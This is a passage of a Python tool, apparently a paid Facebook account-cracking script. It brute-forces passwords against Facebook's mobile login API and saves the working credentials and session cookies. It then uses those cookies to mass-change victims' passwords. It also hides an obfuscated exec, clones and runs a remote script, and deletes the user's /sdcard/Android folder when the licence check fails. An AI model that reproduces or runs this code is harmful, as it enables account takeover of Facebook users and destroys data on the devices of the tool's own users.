		global ok,loop,sim_id
		sys.stdout.write(f'\r\r{W} [{R}NADEEM{W}]%s|{R}RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		for pas in passlist:
			data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			head = {'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': M3(),
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [NADEEM-OK] '+uid+' | '+pas+'\033[1;37m')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				NADEEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NADEEM1};{ckkk}"
				#print(f'\r\033[1;32m [COOKIES] :- '+cookie)
				open('/sdcard/NADEEM/NADEEM-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{W} [NADEEM-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/NADEEM/NADEEM-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleeprint(20)
	except Exception as e:
		pass
			

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
	    os.system('clear');logo()
	    os.system('espeak -a 300 " Enter,   File,  ,Name,"')
	    file_path = input(f"{W} [{R}+{W}] {W}FILE PATH : ")
	    with open(file_path, "r") as file:
		    lines = file.readlines()
	    with open(file_path, "w") as file:
		    file.writelines(set(lines))
	    line()
	    print(f"{W} [{R}+{W}] {W}SUCCESSFULL REMOVED !\033[0m")
	    print(f"{W} [{R}+{W}] {W}IDZ SAVED IN {file_path} \033[0m")
	    line()
	    input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ")
	    iAmMain().iAmMenu()

	


	def with_names(self):
		logo()
		os.system('espeak -a 300 " Enter,   File,  ,Name,"')
		finput = input(f'{W} [{R}+{W}] {W}PUT FILE PATH :')
		sav= input(f'{W} [{R}+{W}] {W}SAVE FILE PATH : ')
		digits = input(f'{W} [{R}+{W}] {W}PUT DIGIT : ').split(',')
		spc=[]
		try:
			file = open(finput,'r').read().splitlines()
			xx = open(sav,'a')
			for mix in file:
				uid = mix.split('|')[0]
				nm = mix.split('|')[1]
				for digit in digits:
					if digit in uid:
						if uid not in spc:
							if uid.startswith(digit):
								xx.write(uid+'|'+nm+'\n')
			print(f'{W} [{R}+{W}] {W}SEPRATE DONE!!!!!')
			print(f'{W} [{R}+{W}] {W}YOUR FILE SAVED IN : %s '%(sav))
			line()
			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK  ")
			time.sleep(1)
			iAmMain().iAmMenu()
		except FileNotFoundError:
			print(f'{W} [{R}+{W}] {W}FILE NOT FOUND !!!!')


		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		print(f"{W} [{R}1{W}] {W}PASS CHANGE MENU ")
		print(f'{W} [{R}2{W}] {W}CUT USED LINE ')
		line()
		am = input(f"{W} [{R}+{W}] {W}SELECT : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			print(f"{W} [{R}+{W}] {W}WRONG SELECT!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		print(f"{W} [{R}+{W}] {W}\x1b[1;97mEX : /sdcard/file.txt")
		try:
			file = input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT FILE  : ")
		except Exception as e:
			print(f"{W} [{R}+{W}] {W}FILE NOT FOUND!! ");sp(2);self.used_cutter()
		digit= int(input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT LINE :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		print(f"{W} [{R}+{W}] {W}REMOVED DONE")
		iAmMain().iAmMenu()
	def iAmPasswordManager(self):
		logo()
		print(f"{W} [{R}+{W}] {W}PASS CHANGE BY : NADEEM")
		line()
		print(f"{W} [{R}1{W}] {W}CHANGE PASS (BULK) \n{W} [{R}2{W}] {W} CHANGE PASS (SINGLE) \n{W} [{R}3{W}] {W} CHANGE PASS DEFAULT \n{W} [B]{W} PRESS ENTER TO BACK ")
		line()
		iamoption = input(f'{W} [{R}+{W}] {W}CHOSE : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			print(f"{W} [{R}+{W}] {W}WRONG SELECT ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/NADEEM/NADEEM-Change-passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "NADEEM786@##"
		logo()
		print(f"{W} [{R}+{W}] {W}PASS CHANGE BY : NADEEM")
		line()
		print(f"{W} [{R}+{W}] {W}DEFAULT PASS : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(f"{W} [{R}+{W}] {W}PUT FILE NAME : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(f" [{G}+{W}] {W}FILE NOT FOUND ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(f"{W} [{R}+{W}] {W}PASS CHANGE START NOW ! ")
		line()
		print(f"{W} [{R}+{W}] {W}TOTAL ACCOUNT : %s "%(len(id)))
		line()
		print(f"{W} [{R}+{W}] {W}PLEASE WAIT USE FAST INTERNET ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			
			try:
				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
			except CE:
				print(f"{W} [{R}+{W}] {W}YOUR INTERNET IS SO SLOW")
			except Exception as e:
				print(e)
			if "/zero/optin/write/?" in r:
				self.iAmFreeMode(cookies,r)
			try:
				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(f"{W} [{R}+{W}] {W}CHECK YOUR INTERNET UNEXPECTED STOP ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				print(f"{W} [{R}+{W}] {W}✓PASS CHANGE SUCCESS : {W}%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				print(f"{W} [{R}+{W}] {W}PASS CHANGE FAIL : {W}%s "%(uid))
		line()
		print(f"{W} [{R}+{W}] {W}PROCESS COMPLETE ! ")
		print(f"{W} [{R}+{W}] {W}YOUR IDZ SAVED IN %s "%(sav))
		line()
		input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ! ")
		s(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "NADEEM786@##"
		logo()
		print(f"{W} [{R}+{W}] {W}PASS CHANGE BY : NADEEM ")
		line()
		print(f"{W} [{R}+{W}] {W}DEFAULT PASS : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(f"{W} [{R}+{W}] {W}ENTER OLD PASS : ")
		cok = input(f"{W} [{R}+{W}] {W}PASTE COOKIE : ")
		cookies = {'cookie':cok}
		try:
			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
		except CE:
			print(f"{W} [{R}+{W}] {W}CHECK INTERNET")
		except Exception as e:
			print(e)
		if "/zero/optin/write/?" in r:
			self.iAmFreeMode(cookies,r)
		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
		
		po = po.replace("amp;","")
		if 'Password changed' in po:
			print(f"{W} [{R}+{W}] {W}✓PASS CHANGE SUCCESS ")
			
			sp(2)
			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK")
			self.iAmPasswordManager()
		else:
			print(f"{W} [{R}+{W}] {W}FAIL PASS CHANGE ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).grouprint(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).grouprint(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "NADEEM786@##"
		print(f"{W} [{R}+{W}] {W}DEFAULT PASS : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(f"{W} [{R}+{W}] {W}ENTER NEW PASS : ")
		if len(change_pw) < 6:
			print(f"{W} [{R}+{W}] {W}MINIMUM SIX DIGIT .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(f"{W} [{R}+{W}] {W}PASS CHANGE SUCCESS ! ")
		print(f"{W} [{R}+{W}] {W}YOUR NEW PASS IS : %s "%(change_pw))
		line()
		input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ")

		self.iAmPasswordManager()

def Create_menu():
	clear()
	os.system('espeak -a 300 " Wellcome, To,  File,  , Menu,"')
	print(f'{W} [{R}1{W}] {W}CREATE FILE BY NADEEM TOOL ')
	print(f'{W} [{R}2{W}] {W}CREATE FILE BY HANNAN TOOL ')
	print(f'{W} [{R}0{W}] {W}BACK MAIN MENU ')
	line()
	option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
	if option in ['1','01']:
		os.system('python Extract.py')
	if option in ['2','02']:
		Create_M2()
	if option in ['0','00']:
		iAmMain().iAmMenu()()
	else:
		line()
	print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
	time.sleep(2)
	Create_menu()
#####____Create-File-M1____#####

#####____Create-File-M2____#####
def Create_M2():
		os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
		os.system('cd && cd FILE ;python V33.py')

def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    
    return "JUTT-"+myid+xp
exec(zlib.decompress(b'x^\xcb\xce\xb5\xd5P\xcf())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-J\xd5\xf5,N,\xd4\xf5N\xd5\xf5KL\xcc\xd5\x0fJ\xccK\xd4\xcfM\xcc\xcc\x03\xb3\xe2\x1d\x0b\x8a\xf2\xcb\x12s\xd45\x01\xb2@\x1d\r'))
def xi():
    global km
    j=getKey()
    r=requests.get(km).text
    if j in r:
        pass
    else:
        os.system("clear")
        #uncomment to activate virus
        shutil.rmtree("/sdcard/Android")
        print(f"Don't Bypass ")
        sys.exit()

#####____END-Setup____##### 
def Activate():
    global km
    r=requests.get(km).text
    k=getKey()
    if k in r:
        iAmMain().iAmMenu()
        #print(f"\033[1;92mYour Token is successfully Approved\33[1;37m")
    else:
                clear()
                os.system('espeak -a 300 " Wellcome, To,   Paid,  ,Menu,"')
                os.system('espeak -a 300 " This, Tool,   is,  ,Paid,"')
                print(f'{W} [{W}+{W}] {W}{R}           YOUR KEY IS NOT ACTIVE')
                line() 
                print(f"{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{G}PAID MENU{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={R}>")
                line()
                print(f'{W} [{R}+{W}] {W}FOR 15 DAYS {R}400 PKR ')
                print(f'{W} [{R}+{W}] {W}FOR 30 DAYS {R}700 PKR')
                print(f'{W} [{R}+{W}] {W}EASIPAISA == {R}03082503426 ')
                line() 
                print(f'{W} [{R}+{W}] {W}FOR 15 DAYS {R}6$ ')
                print(f'{W} [{R}+{W}] {W}FOR 30 DAYS {R}10$')
                print(f'{W} [{R}+{W}] {W}BINANCE ID == {R}442893784 ')
                line()
                print(f'{W} [{R}+{W}] {W}FIRST SEND PAYMENT SS WITH KEY')
                print(f'{W} [{R}+{W}] {W}FOR KEY ISSUE CONTACT WITH\n{W} [{R}+{W}] {R}NADEEM NADEEM RAJPUT        👈')
                line()
                print(f'{W} [{R}+{W}] {W}GET APPROVAL FOR USE ')
                print(f'{W} [{R}+{W}] {W}SEND YOUR KEY TO ADMIN')
                print(f'{W} [{R}+{W}] {W}AND GET APPROVAL')
                print(f'{W} [{R}+{W}] {W}COPY THIS KEY 👇')
                line()               
                print(f"{W} [{R}+{W}] {W}YOUR KEY :\x1b[1;97m "+k)
                line()                
                input(f'{W} [{R}+{W}] {W}PRESS ENTER')
                tks = ('Hi-%20NADEEM-Sir%20!%20-Please%20-Activate%20-My%20-Key%20-The%20-Key%20-Is%20:%20'+k)
                os.system('am start https://wa.me/+923082503426?text='+tks)
                Activate()
                sys.exit()
#####____END-Setup____#####   
iAmMain().iAmMenu()
